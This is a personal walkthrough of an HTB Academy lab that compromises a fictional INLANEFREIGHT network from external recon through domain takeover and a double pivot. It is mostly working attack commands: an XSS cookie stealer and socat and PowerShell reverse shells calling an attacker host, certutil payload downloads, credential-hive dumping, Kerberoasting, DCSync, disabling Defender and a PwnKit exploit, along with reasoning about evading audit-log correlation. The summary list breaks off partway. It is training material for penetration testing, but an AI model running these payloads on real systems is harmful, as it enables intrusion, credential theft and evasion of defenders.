# INLANEFREIGHT — Attacking Enterprise Networks

> Full kill chain from external recon to root on the management subnet across three subnets and seven hosts. HTB Academy module: *Attacking Enterprise Networks*.

---

## Table of Contents

1. [Lab Overview](#lab-overview)
2. [Phase 1 — External Information Gathering](#phase-1--external-information-gathering)
3. [Phase 2 — Service Enumeration](#phase-2--service-enumeration)
4. [Phase 3 — Web Enumeration & Exploitation](#phase-3--web-enumeration--exploitation)
5. [Phase 4 — Initial Access](#phase-4--initial-access)
6. [Phase 5 — Post-Exploitation Persistence](#phase-5--post-exploitation-persistence)
7. [Phase 6 — Internal Information Gathering](#phase-6--internal-information-gathering)
8. [Phase 7 — DEV01 Exploitation & Privilege Escalation](#phase-7--dev01-exploitation--privilege-escalation)
9. [Phase 8 — Lateral Movement](#phase-8--lateral-movement)
10. [Phase 9 — Active Directory Compromise](#phase-9--active-directory-compromise)
11. [Phase 10 — Post-Exploitation & Double Pivot](#phase-10--post-exploitation--double-pivot)
12. [Final Kill Chain](#final-kill-chain)
13. [Credential Inventory](#credential-inventory)
14. [Findings & Lessons Learned](#findings--lessons-learned)

---

## Lab Overview

### Network Topology

```
                 ┌──────────────────────┐
                 │  Kali (tun0)         │
                 └──────────┬───────────┘
                            │ HTB VPN
                 ┌──────────▼───────────┐
                 │  dmz01  (public)     │  ← initial foothold via SSH brute force
                 │  internal: 172.16.8.120 │
                 └──────────┬───────────┘
                            │ Ligolo agent #1  ──>  172.16.8.0/24
              ┌─────────────┼─────────────┐
              │             │             │
       ┌──────▼─────┐ ┌─────▼─────┐ ┌─────▼──────┐
       │ DC01       │ │ DEV01     │ │ MS01       │
       │ 172.16.8.3 │ │ .8.20     │ │ .8.50      │
       └────┬───────┘ └───────────┘ └────────────┘
            │ second NIC into 172.16.9.0/24
            │ Ligolo agent #2  ──>  172.16.9.0/24
            ▼
       ┌──────────────┐
       │ mngt01       │  ← final box (PwnKit root)
       │ 172.16.9.x   │
       └──────────────┘
```

### Hosts

| Host    | IP                              | Role                       | Notes                                |
| ------- | ------------------------------- | -------------------------- | ------------------------------------ |
| dmz01   | (public) / `172.16.8.120` int   | Linux pivot                | SSH entry; hosts multiple web vhosts |
| DC01    | `172.16.8.3` / `172.16.9.x`     | Domain Controller (dual-NIC) | INLANEFREIGHT.LOCAL                |
| DEV01   | `172.16.8.20`                   | Windows dev server         | DNN, MSSQL, NFS export               |
| MS01    | `172.16.8.50`                   | Windows member server      | Sysax automation suite               |
| mngt01  | `172.16.9.x`                    | Linux management host      | PwnKit vulnerable                    |

---

## Phase 1 — External Information Gathering

### Methodology

Initial recon of the public-facing host. Goal: enumerate exposed services, identify the authoritative DNS server, perform a zone transfer if allowed, and discover vhosts.

### Commands

**Aggressive nmap scan** revealed several open ports including a non-standard service banner on port 1337:

```bash
sudo nmap -sC -sV -A -T4 -p- 10.129.229.147 -oA scans/dmz01
```

**Confirm authoritative nameserver:**

```bash
dig NS inlanefreight.local @10.129.229.147
```

**Attempt DNS zone transfer** (looking for IP maps, mail servers, API key leakage, internal aliases, plaintext creds):

```bash
dig AXFR inlanefreight.local @10.129.229.147
```

Zone transfer succeeded — disclosed a flag and a full list of public subdomains.

**Vhost fuzzing with `ffuf`** — established a baseline response size first to avoid false positives, then enumerated additional vhosts (discovered `monitoring`):

```bash
# Baseline (random Host header to determine filter-size)
ffuf -u http://10.129.229.147/ -H "Host: nonexistent.inlanefreight.local" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt

# Filter against baseline size
ffuf -u http://10.129.229.147/ -H "Host: FUZZ.inlanefreight.local" \
     -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -fs <baseline_size>
```

---

## Phase 2 — Service Enumeration

### Methodology

Test each open service for weak/anonymous authentication. In enterprise environments FTP is frequently left anonymous for convenience.

### Commands

**Anonymous FTP** — first thing to try:

```bash
# Pull flag without entering interactive mode
curl ftp://anonymous:@10.129.229.147/flag.txt
```

```bash
# Or interactive
ftp 10.129.229.147
# user: anonymous     pass: <blank>
```

---

## Phase 3 — Web Enumeration & Exploitation

Each vhost demonstrated a different web vulnerability class. Summary of the chain:

### Careers vhost — IDOR

Profile IDs were sequentially assigned (1, 2, ...). Incrementing the ID in the URL granted access to other users' profiles without re-authentication. No exploit code needed beyond changing the trailing integer.

### dev vhost — HTTP Verb Tampering → Unrestricted File Upload

- Subdomain enumeration revealed `upload.php`
- Captured a request in Burp; `OPTIONS` response disclosed: `Allow: GET, POST, PUT, TRACK, OPTIONS`
- `TRACK` request exposed the custom header `X-Custom-IP-Authorization: 172.18.0.1`
- After setting that header to my own internal IP (and fighting hidden newline characters in the Burp request), the file upload page became reachable
- Initial attempt with double extension `.php.png` failed — the server treated it as static HTML, not as executable PHP
- Working approach: upload a `.php` web-shell with the `Content-Type` header tampered to `image/png`

**Takeaway for next time:** use Burp Intruder to fuzz both accepted extensions and accepted MIME types up-front.

### ir vhost — Local File Inclusion (Mail-Masta plugin)

WordPress instance with outdated `mail-masta` plugin:

```bash
wpscan --url http://ir.inlanefreight.local/ --enumerate p
```

Vulnerable LFI in `count_of_send.php`. Flag read with a single curl:

```bash
curl "http://ir.inlanefreight.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/www/html/flag.txt"
```

### status vhost — SQL Injection

Search bar with no input sanitization. Confirmed with a single quote — DBMS errored out. Captured the POST request in Burp, saved it to a file, then ran sqlmap end to end:

```bash
# Save the captured request as status_request.txt, then:
sqlmap -r status_request.txt --batch --dbms=mysql --dbs
sqlmap -r status_request.txt --batch --dbms=mysql -D <database> --tables
sqlmap -r status_request.txt --batch --dbms=mysql -D <database> -T <table> --dump
```

Dump included an admin password hash that came in useful later for the `monitoring` vhost lookup table.

### support vhost — Stored XSS via Ticketing System

Ticket-submission form rendered submitted content inside the admin's view — perfect for stored XSS to steal the admin session cookie.

```bash
# Listener on Kali
nc -nlvvp 4444

# Local web directory with cookie-stealer
mkdir xss && cd xss
cat > index.php <<'EOF'
<?php
$cookie = $_GET['c'] ?? '';
file_put_contents('cookies.log', $cookie."\n", FILE_APPEND);
?>
EOF
php -S 0.0.0.0:8000

# Payload submitted in ticket body
<script>fetch('http://<KALI_IP>:8000/?c='+document.cookie)</script>
```

After capture, set `session` cookie via DevTools → Application → Cookies and reloaded `/login`, which authenticated the session automatically.

### tracking vhost — SSRF → Local File Read

Input rendered to a PDF on the server side; field was not restricted to numerics, allowing JS/HTML injection. Adapted a public payload and confirmed it returned arbitrary file contents from the backend, then pointed it at `/root/` to recover the flag.

### gitlab vhost — User Registration Open

This GitLab build did not restrict new-user registration. Created an account, browsed *Explore → Projects* and the flag was immediately visible. Also surfaced additional vhosts to test.

### shopdev2 vhost — XXE Injection

Burp traffic revealed XML being processed by the backend. Crafted an XXE payload referencing the parsed variable (`userid`) and read `flag.txt` from the server root.

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///flag.txt">]>
<userid>&xxe;</userid>
```

> Key pitfall: the entity has to be referenced inside the field that the backend actually parses (`userid` here), and the reference must be `&entity;` exactly — with the leading `&` and the trailing `;`.

### monitoring vhost — Authenticated Command Injection — `admin:12qwaszx`

This was the vhost that ffuf discovered, requiring authentication. The earlier SQLi-dumped admin hash table had this hash:

```
4528342e54d6f8f8cf15bf6e3c31bf1f6  Admin
```

The web app was a restricted shell, but its built-in *connection test tool* (which ran `ping.php` server-side as `localhost`) accepted user input. Intercepting the request in Burp showed the parameter was unescaped. The PHP source had blacklisted nearly every reverse-shell binary (`nc`, `bash -i`, `python`, ...) **except `socat`** — likely because socat was used legitimately on the box.

Final working payload bypassed the blacklist using non-standard substitution and called back to Kali:

```bash
# Listener
socat - TCP-LISTEN:4444,reuseaddr,fork

# Payload (via the monitoring tool's input box)
;socat TCP:<KALI_IP>:4444 EXEC:/bin/sh
```

Got a stable webshell as the web service account.

---

## Phase 4 — Initial Access

### Methodology

Stabilize the shell, then look for credential reuse opportunities. The web user belonged to the `adm` group, which is the standard Linux convention for the *log readers* — meaning `aureport` and `journalctl` history are both readable.

### Commands

```bash
# Stabilize the reverse shell
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z, then on Kali:
stty raw -echo; fg
```

```bash
id
# uid=33(www-data) groups=33(www-data),4(adm)

# Enumerate audit logs as adm member
aureport --auth --summary
aureport -l
aureport -u

# Search the journal for credential leaks
journalctl --no-pager | grep -iE 'password|user'
```

Audit logs surfaced cleartext: **`srvadm:ILFreightnixadm!`**.

```bash
su - srvadm
# password: ILFreightnixadm!
```

`srvadm` was a member of additional groups with broader filesystem access than `www-data`. Stabilized another shell for persistence work.

---

## Phase 5 — Post-Exploitation Persistence

### Methodology

Check for granted `sudo` rights — when a user can run any binary that performs arbitrary file reads as root, you effectively have root file-read.

### Commands

```bash
sudo -l
# User srvadm may run:
#   (root) NOPASSWD: /usr/bin/openssl
```

`openssl` as `sudo` is well-documented in GTFOBins — it can read any file as root via its file processing primitives:

```bash
# Read root's SSH private key
sudo openssl enc -in /root/.ssh/id_rsa
```

Exfiltrated the key, gave it correct permissions on Kali, and authenticated as root over SSH:

```bash
chmod 600 dmz01_root_id_rsa
ssh -i dmz01_root_id_rsa root@<dmz01_IP>
```

> Persistent root SSH was the foundation for everything that follows — the Ligolo agent runs *as root on this host* for the rest of the engagement.

---

## Phase 6 — Internal Information Gathering

### Methodology

Rather than chaining `proxychains` for every internal command, set up a Ligolo-ng pivot. This makes the internal `172.16.8.0/24` look like just another route to the Kali kernel — every tool (nmap, smbclient, evil-winrm, crackmapexec, xfreerdp) works natively.

### Ligolo-ng setup

**On Kali — start the proxy and create the TUN interface:**

```bash
sudo ip tuntap add user kali mode tun promptnova
sudo ip link set promptnova up
sudo ip route add 172.16.8.0/24 dev promptnova
sudo ./proxy -selfcert -laddr 0.0.0.0:11601 -keepalive 60s
```

**On dmz01 — fetch and launch the agent:**

```bash
# From Kali, serve agent.exe / agent (Linux):
python3 -m http.server 8080

# On dmz01:
wget http://<KALI_TUN0_IP>:8080/agent
chmod +x agent
./agent -connect <KALI_TUN0_IP>:11601 -ignore-cert &
```

**Inside the Ligolo CLI on Kali:**

```
session                                       # select agent
start                                         # or: tunnel_start --tun promptnova
listener_add --addr 0.0.0.0:445  --to 127.0.0.1:445
listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444
listener_list
```

### Internal nmap (through the pivot, natively)

```bash
nmap -Pn -T4 -p- --min-rate 1000 172.16.8.0/24 -oA scans/internal
nmap -sV -sC -p 80,443,445,3389,5985,49730 172.16.8.0/24 -oA scans/internal_svc
```

Identified hosts: **DC01 `172.16.8.3`**, **DEV01 `172.16.8.20`** (DotNetNuke on 80, MSSQL on 49730, NFS on 2049, RDP open), **MS01 `172.16.8.50`**.

### NFS hunt for DNN credentials

```bash
showmount -e 172.16.8.20
# /DEV01 (everyone)

sudo mkdir -p /mnt/dev01
sudo mount -t nfs 172.16.8.20:/DEV01 /mnt/dev01

# Hunt for DNN config secrets
find /mnt/dev01 -name 'web.config' -exec grep -liE 'pass|connectionstring|user id' {} +
grep -ri -E 'password|connectionstring|user id|pwd=' /mnt/dev01/ 2>/dev/null
```

`web.config` disclosed SQL connection strings used by the DotNetNuke instance — the SA-equivalent account it ran under.

---

## Phase 7 — DEV01 Exploitation & Privilege Escalation

### Methodology

DotNetNuke superuser login granted access to the SQL Console module, which is the cleanest path to a SYSTEM shell on a Windows IIS server. From SQL admin → `xp_cmdshell` → PowerShell → reverse shell as `mssql$sqlexpress`. Then PrintSpoofer (because `SeImpersonatePrivilege` is enabled on service accounts) to SYSTEM.

### DNN → MSSQL command execution

After logging in to DotNetNuke as superuser, navigated to *Host → SQL*. Verified `sysadmin` and enabled `xp_cmdshell`:

```sql
SELECT IS_SRVROLEMEMBER('sysadmin');  -- returns 1

EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';
```

### Base64-encoded PowerShell trick

Instead of staging a reverse shell file via DNN's file manager (HTB's path), I pushed an entire PowerShell reverse-shell script through `xp_cmdshell` as one base64 blob. This avoids both SQL-quoting hell and the multi-layer command escaping that a nested `cmd.exe → powershell` chain would otherwise require.

```bash
# On Kali — generate the payload
CMD='$client = New-Object System.Net.Sockets.TCPClient("172.16.8.120",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String);$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

# Base64-encode for the -EncodedCommand flag (UTF-16LE little-endian!)
B64=$(echo -n "$CMD" | iconv -t UTF-16LE | base64 -w 0)
echo "$B64"
```

In the DNN SQL Console:

```sql
EXEC xp_cmdshell 'powershell -nop -w hidden -e <BASE64_BLOB>';
```

### Routing the reverse shell back through dmz01

DEV01 cannot directly reach Kali's `tun0` IP; the callback has to traverse the Ligolo tunnel. With `listener_add 0.0.0.0:443 → 127.0.0.1:443` on the dmz01 agent already in place, point DEV01 at `172.16.8.120:443` and the listener forwards it home:

```bash
# On Kali — netcat catcher
nc -nlvvp 443
```

The reverse shell landed as `nt service\mssql$sqlexpress` with `SeImpersonatePrivilege` enabled — perfect for PrintSpoofer.

### PrintSpoofer → SYSTEM

```bash
# From Kali — serve binaries
python3 -m http.server 8080
```

```cmd
:: On DEV01 — pull PrintSpoofer and nc
cd C:\Windows\Temp
certutil -urlcache -split -f http://172.16.8.120:8080/PrintSpoofer64.exe ps.exe
certutil -urlcache -split -f http://172.16.8.120:8080/nc.exe nc.exe

:: One-shot SYSTEM callback through Ligolo
ps.exe -i -c "C:\Windows\Temp\nc.exe 172.16.8.120 4444 -e cmd"
```

> Lost the listener once mid-engagement and recovered by base64-encoding the `PrintSpoofer` invocation back through the still-active SQL console — same trick as the initial shell.

### Hive dumping

```cmd
:: As SYSTEM
reg save HKLM\SAM      C:\Windows\Temp\SAM.SAVE
reg save HKLM\SYSTEM   C:\Windows\Temp\SYSTEM.SAVE
reg save HKLM\SECURITY C:\Windows\Temp\SECURITY.SAVE
```

```bash
# Serve from Kali via the SMB listener forward already in place
sudo impacket-smbserver share /tmp/loot -smb2support -username test -password test
```

```cmd
:: From DEV01
net use \\172.16.8.120\share /user:test test
copy C:\Windows\Temp\SAM.SAVE      \\172.16.8.120\share\
copy C:\Windows\Temp\SYSTEM.SAVE   \\172.16.8.120\share\
copy C:\Windows\Temp\SECURITY.SAVE \\172.16.8.120\share\
```

```bash
# On Kali — parse the hives
cd /tmp/loot
impacket-secretsdump -sam SAM.SAVE -system SYSTEM.SAVE -security SECURITY.SAVE LOCAL
```

**Yielded:**

```
Administrator:500:aad3b...:0e20798f695ab0d04bc138b22344cea8:::
mpalledorous:1001:aad3b...:3bb874a52ce7b0d64ee2a82bbf3fe1cc:::
[*] $MACHINE.ACC
DEV01$ : aad3b...:58d7321ddb81208129eb4058c39d785d
[*] Cached domain logon information:
INLANEFREIGHT.LOCAL/hporter:$DCC2$10240#hporter#f7d7bba128ca183106b8a3b3de5924bc
[*] LSA Secrets — DefaultPassword
(Unknown User):Gr8hambino!
```

The AutoLogon residue paired with the cached `hporter` domain logon gave the first domain credential: **`hporter:Gr8hambino!`**.

### Cracking `mpalledorous` (later)

```bash
echo "3bb874a52ce7b0d64ee2a82bbf3fe1cc" > /tmp/mp.hash
hashcat -m 1000 /tmp/mp.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
hashcat -m 1000 /tmp/mp.hash --show
# 3bb874a52ce7b0d64ee2a82bbf3fe1cc:1squints2
```

---

## Phase 8 — Lateral Movement

### Methodology

After dumping DEV01's hives, the goal becomes finding paths *into* the domain. The first cred is just one of many — but BloodHound's job is to find the shortest path from where you stand to where you want to be. Run it early.

### Domain enumeration

```bash
# Pull user list
impacket-GetADUsers -all INLANEFREIGHT.LOCAL/hporter:'Gr8hambino!' -dc-ip 172.16.8.3 \
  | awk '{print $1}' > /tmp/loot/users.txt

# Confirm hporter can read NETLOGON, hunt scripts
impacket-smbclient INLANEFREIGHT.LOCAL/hporter:'Gr8hambino!'@172.16.8.3
# inside:
use NETLOGON
get adum.vbs
exit

grep -iE 'password|cred|user' adum.vbs
# Discovered: account=...; password="L337^p@$$w0rD"
# (Orphan — username field was a placeholder, never tied to a confirmed account)
```

### Kerberoasting

```bash
impacket-GetUserSPNs INLANEFREIGHT.LOCAL/hporter:'Gr8hambino!' -dc-ip 172.16.8.3 \
  -request -outputfile /tmp/loot/kerberoast.hashes

# 12 SPN hashes harvested:
# azureconnect, backupjob, mssqlsvc, sqltest, sqlqa, sqldev,
# mssqladm, svc_sql, sqlprod, sapsso, sapvc, vmwarescvc

hashcat -m 13100 /tmp/loot/kerberoast.hashes \
  /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
hashcat -m 13100 /tmp/loot/kerberoast.hashes --show
# backupjob:lucky7  ← single cracked SPN account
```

### BloodHound collection & analysis

```bash
mkdir -p /tmp/loot/bloodhound && cd /tmp/loot/bloodhound
bloodhound-python -u backupjob -p 'lucky7' -d inlanefreight.local -ns 172.16.8.3 -c All --zip
```

For the UI I used BloodHound CE in Docker:

```bash
cd ~/bloodhound-ce
sudo docker compose up -d
# Browse to http://localhost:8080
```

**Queries that mattered most** (only three are needed for ~80% of engagements):

1. Mark current user as **Owned** → *Shortest Paths from Owned Principals*
2. **Find Principals with DCSync Rights**
3. Right-click krbtgt / Domain Admins → *Shortest Paths to Here from Owned*

Marking `hporter` as Owned and running the shortest-paths query immediately revealed:

```
hporter  --ForceChangePassword-->  ssmalls
```

### Reset `ssmalls` with bloodyAD

```bash
bloodyAD --host 172.16.8.3 -d INLANEFREIGHT.LOCAL -u hporter -p 'Gr8hambino!' \
  set password ssmalls 'Str0ngpass86!'

# Verify
crackmapexec smb 172.16.8.3 -u ssmalls -p 'Str0ngpass86!' -d INLANEFREIGHT.LOCAL
```

### Department Shares → backupadm

`ssmalls` is the sole member of the IT group; with their creds the `Department Shares` share becomes readable.

```bash
crackmapexec smb 172.16.8.3 -u ssmalls -p 'Str0ngpass86!' -d INLANEFREIGHT.LOCAL \
  -M spider_plus --share 'Department Shares'
cat /tmp/cme_spider_plus/172.16.8.3.json | less

# Pull the SQL Express Backup script
smbclient //172.16.8.3/'Department Shares' \
  -U 'INLANEFREIGHT.LOCAL\ssmalls%Str0ngpass86!' \
  -c 'cd IT\Private\Development; get "SQL Express Backup.ps1"'

cat 'SQL Express Backup.ps1' | grep -E 'Login|Password'
# $mySrvConn.Login    = "backupadm"
# $mySrvConn.Password = "!qazXSW@"
```

**`backupadm:!qazXSW@`** — hardcoded in the backup script (keyboard-walk password).

### WinRM to MS01 as `backupadm`

```bash
# Sweep first to confirm
crackmapexec winrm 172.16.8.0/24 -u backupadm -p '!qazXSW@' \
  -d INLANEFREIGHT.LOCAL --continue-on-success
# (Pwn3d!) on 172.16.8.50

evil-winrm -i 172.16.8.50 -u backupadm -p '!qazXSW@'
```

### Reading `unattend.xml` for `ilfserveradm`

```powershell
type C:\panther\unattend.xml
```

```xml
<AutoLogon>
  <Username>ilfserveradm</Username>
  <Password><Value>Sys26Admin</Value><PlainText>true</PlainText></Password>
</AutoLogon>
```

> `ilfserveradm` is a **local** account (confirmed by the `<LocalAccount>` block at the bottom of the file). Not visible from the DC.

### RDP and Sysax Automation privesc

```bash
xfreerdp /v:172.16.8.50 /u:ilfserveradm /p:'Sys26Admin' /cert:ignore /drive:share,/tmp/loot
```

Procedure (all in the GUI):

1. Open `C:\Program Files (x86)\SysaxAutomation\sysaxschedscp.exe`
2. *Setup Scheduled/Triggered Tasks*
3. Add task → **Triggered**
4. Folder to monitor: `C:\Users\ilfserveradm\Documents`
5. Check *Run task if a file is added to the monitor folder or subfolder(s)*
6. Choose *Run any other Program* → `C:\Users\ilfserveradm\Documents\pwn.bat`
7. **Uncheck *Login as the following user to run task*** — the bug: when this is unchecked, the task falls back to the LocalSystem context
8. Finish → Save

`pwn.bat` (I used the netcat callback variant rather than `net localgroup ... /add`, so I wouldn't need to reboot):

```cmd
C:\temp\nc.exe 172.16.8.50 4445 -e cmd
```

```cmd
:: In a separate cmd window on MS01
C:\temp\nc.exe -nlvvp 4445

:: Trigger by dropping a file in the monitored folder
echo trigger > C:\Users\ilfserveradm\Documents\trigger.txt
```

Catcher prompt:
```
nt authority\system
```

### Hive dump → `mssqladm` from LSA Secrets

There was an issue copying hives to `\\TSCLIENT\share\` *as SYSTEM* because TSCLIENT lives in the `ilfserveradm` RDP session context, not in the global namespace. Fix: drop privileges back to admin for the copy step.

```cmd
:: As SYSTEM
reg save HKLM\SAM      C:\temp\sam.save
reg save HKLM\SYSTEM   C:\temp\sys.save
reg save HKLM\SECURITY C:\temp\sec.save

icacls C:\temp\sec.save /grant ilfserveradm:F
icacls C:\temp\sys.save /grant ilfserveradm:F
icacls C:\temp\sam.save /grant ilfserveradm:F

exit
:: back in ilfserveradm prompt
copy C:\temp\*.save \\TSCLIENT\share\
```

```bash
# On Kali
impacket-secretsdump -security sec.save -system sys.save LOCAL
# [*] DefaultPassword
# (Unknown User):DBAilfreight1!
# $MACHINE.ACC :: MS01$ NT hash 7fd1e8a146a95b351ffc5af3b9520bb5
```

`DefaultUserName` came back **empty** from the registry — the unattend cleanup wiped it. Used the kerberoasting account list to spray:

```bash
crackmapexec smb 172.16.8.0/24 -u mssqladm -p 'DBAilfreight1!' \
  -d INLANEFREIGHT.LOCAL --continue-on-success
# Auth succeeds → DefaultPassword belongs to mssqladm
```

**`INLANEFREIGHT\mssqladm:DBAilfreight1!`**.

---

## Phase 9 — Active Directory Compromise

### Methodology

This is the part where BloodHound earns its keep. Marked `mssqladm` as Owned and re-collected — discovered a two-hop ACL chain that ended the domain in three commands.

```
mssqladm  --[GenericWrite]-->  TTIMMONS
TTIMMONS  --[GenericAll]-->    Server Admins   ←(has GetChanges, GetChangesAll, GetChangesInFilteredSet over the domain)
```

`Server Admins` had no other members — this group was a single-hop step to DCSync.

### Targeted Kerberoasting on TTIMMONS

`TTIMMONS` was not in the original Kerberoast harvest because the account had no SPN at all. BloodHound's node properties panel confirmed `servicePrincipalName` was empty. With GenericWrite, I could **add one**:

```bash
# Add a fake SPN
bloodyAD --host 172.16.8.3 -d INLANEFREIGHT.LOCAL -u mssqladm -p 'DBAilfreight1!' \
  set object TTIMMONS servicePrincipalName -v 'cifs/anything.fake.local'

# Request the TGS
impacket-GetUserSPNs INLANEFREIGHT.LOCAL/mssqladm:'DBAilfreight1!' -dc-ip 172.16.8.3 \
  -request-user TTIMMONS -outputfile /tmp/loot/ttimmons.hash

# Crack offline
hashcat -m 13100 /tmp/loot/ttimmons.hash \
  /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
hashcat -m 13100 /tmp/loot/ttimmons.hash --show
# TTIMMONS:Repeat09
```

### Add mssqladm to Server Admins

> I added `mssqladm` here rather than `TTIMMONS` (HTB's walkthrough adds TTIMMONS). My reasoning: `mssqladm` is a high-activity service account, and a service account performing DCSync looks less anomalous in event logs than a user account doing it. Splitting the activity across two principals also breaks the audit chain into separate events that may not get correlated.

```bash
bloodyAD --host 172.16.8.3 -d INLANEFREIGHT.LOCAL -u TTIMMONS -p 'Repeat09' \
  add groupMember 'Server Admins' mssqladm

# Confirm
bloodyAD --host 172.16.8.3 -d INLANEFREIGHT.LOCAL -u TTIMMONS -p 'Repeat09' \
  get object 'Server Admins' --attr member
```

### DCSync

```bash
# Just Administrator — immediate domain takeover
impacket-secretsdump INLANEFREIGHT.LOCAL/mssqladm:'DBAilfreight1!'@172.16.8.3 \
  -just-dc-user Administrator

# Just krbtgt — Golden Ticket capability
impacket-secretsdump INLANEFREIGHT.LOCAL/mssqladm:'DBAilfreight1!'@172.16.8.3 \
  -just-dc-user krbtgt

# Full NTDS dump (~3000 hashes)
impacket-secretsdump INLANEFREIGHT.LOCAL/mssqladm:'DBAilfreight1!'@172.16.8.3 \
  -just-dc -outputfile /tmp/loot/ntds_dump
```

```
Administrator : fd1f7e5564060258ea787ddbb6e6afa2
krbtgt        : b9362dfa5abf924b0d172b8c49ab58ac
```

### Cleanup

```bash
# Remove the SPN I added
bloodyAD --host 172.16.8.3 -d INLANEFREIGHT.LOCAL -u mssqladm -p 'DBAilfreight1!' \
  remove object TTIMMONS servicePrincipalName -v 'cifs/anything.fake.local'

# Remove the group membership I added
bloodyAD --host 172.16.8.3 -d INLANEFREIGHT.LOCAL -u TTIMMONS -p 'Repeat09' \
  remove groupMember 'Server Admins' mssqladm
```

### Post-DCSync NTDS analysis

```bash
# Count empty-history entries (current passwords vs. history records)
grep -c ':::$' /tmp/loot/ntds_dump.ntds

# Surface admin-flavored accounts
grep -iE 'admin|sa_|svc' /tmp/loot/ntds_dump.ntds

# Look for password reuse across accounts (a real-engagement finding)
awk -F: '{print $4}' /tmp/loot/ntds_dump.ntds | sort | uniq -c | sort -rn | head -20

# Crack the whole pile against rockyou + rules
hashcat -m 1000 /tmp/loot/ntds_dump.ntds \
  /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

---

## Phase 10 — Post-Exploitation & Double Pivot

### Methodology

The DC has two NICs — one on `172.16.8.0/24` and one on the management subnet `172.16.9.0/24`. To reach `mngt01` I need to drop a *second* Ligolo agent on DC01 and tunnel through it.

### Log in to DC01 with the DA hash

```bash
evil-winrm -i 172.16.8.3 -u Administrator -H fd1f7e5564060258ea787ddbb6e6afa2
```

### SSH key hunt as DA

Searched every user profile and looked through `C:\ProgramData\ssh\`:

```bash
crackmapexec smb 172.16.8.3 -u Administrator -H fd1f7e5564060258ea787ddbb6e6afa2 \
  -d INLANEFREIGHT.LOCAL \
  -X 'Get-ChildItem -Path C:\Users -Recurse -Force -ErrorAction SilentlyContinue -Include id_rsa,id_dsa,id_ecdsa,id_ed25519,*.ppk,*.pem,authorized_keys 2>$null | Select-Object FullName | Out-String'
```

Also exfiltrated the IT department share with elevated privileges via impacket:

```bash
smbclient //172.16.8.3/'IT$' -U "INLANEFREIGHT.LOCAL/Administrator%aad3b435b51404eeaad3b435b51404ee:fd1f7e5564060258ea787ddbb6e6afa2" --pw-nt-hash -c 'recurse on; prompt off; mget *'
```

Surfaced `ssmallsadm`'s SSH private key — the bridge into the management subnet.

### Dropping Ligolo agent #2 on DC01

```bash
# Upload via evil-winrm
upload /home/kali/tools/ligoloWin/agent.exe C:\Users\Administrator\agent.exe

# Disable Defender first if it's hungry
Set-MpPreference -DisableRealtimeMonitoring $true
Add-MpPreference -ExclusionPath "C:\Users\Administrator"
```

**The crucial part of the double pivot:** the second agent cannot reach Kali directly. It can only reach things on the `172.16.8.0/24` subnet. So we add a Ligolo listener *on agent #1 (dmz01)* that forwards 11601 back to Kali, and point DC01's agent at that.

```
[Agent : root@dmz01] » listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601
```

From DC01's evil-winrm:

```powershell
Start-Process -FilePath C:\Users\Administrator\agent.exe `
  -ArgumentList "-connect 172.16.8.120:11601 -ignore-cert" -WindowStyle Hidden
```

Back in the Ligolo proxy CLI, agent #2 registers as a new session. Set up the second TUN:

```bash
sudo ip tuntap add user kali mode tun promptnova2
sudo ip link set promptnova2 up
sudo ip route add 172.16.9.0/24 dev promptnova2
```

```
ligolo-ng » session     # pick DC01 agent
[Agent : Administrator@DC01] » tunnel_start --tun promptnova2
```

Now Kali sees both `172.16.8.0/24` and `172.16.9.0/24` as natively routed.

### Host discovery on mngt subnet

```bash
# Quick-and-dirty scan, only the ports I care about for interactive access
nmap -Pn --max-retries 0 -T4 -p 22,3389,5985 172.16.9.0/24 -oA scans/mngt01
```

Found SSH open on `172.16.9.25` — `mngt01`.

### SSH with `ssmallsadm`'s key

```bash
chmod 600 ssmallsadm_id_rsa
ssh -i ssmallsadm_id_rsa ssmallsadm@172.16.9.25
```

### Linux privesc — PwnKit (CVE-2021-4034)

```bash
# Check polkit version
pkexec --version
dpkg -l policykit-1
# 0.105-26ubuntu1.2 → VULNERABLE
```

```bash
# On Kali — grab a Python variant (no compiler required on target)
git clone https://github.com/joeammond/CVE-2021-4034 /tmp/loot/pwnkit
cd /tmp/loot/pwnkit
python3 -m http.server 8888
```

Listener for agent #2 must already be in place — Ligolo requires a *separate* listener for each agent if you want to serve files through it:

```
[Agent : Administrator@DC01] » listener_add --addr 0.0.0.0:8888 --to 127.0.0.1:8888
```

```bash
# On mngt01 — target the DC's management-subnet IP
wget http://172.16.9.<DC_mgmt_IP>:8888/CVE-2021-4034.py -O pwn.py
head -5 pwn.py    # sanity check — must be Python, not HTML

# (I caught a raw vs. blob URL mistake here; if your file starts with <!DOCTYPE
# html> you grabbed the GitHub UI page, not the raw file. Use raw.githubusercontent.com)

chmod +x pwn.py
python3 pwn.py

# id
# uid=0(root) gid=0(root) groups=0(root)
```

Captured the final flag.

---

## Final Kill Chain

```
External recon (dmz01, non-standard banner)
  ↓
Web vhost exploitation (8 vhosts, 8 different bug classes)
  ↓
Audit-log credential leak (srvadm:ILFreightnixadm!)
  ↓
sudo openssl → root SSH key on dmz01
  ↓
Ligolo-ng pivot → 172.16.8.0/24 visibility
  ↓
NFS export on DEV01 → web.config → DotNetNuke admin
  ↓
DNN SQL Console → xp_cmdshell → base64 PowerShell → reverse shell as mssql$sqlexpress
  ↓
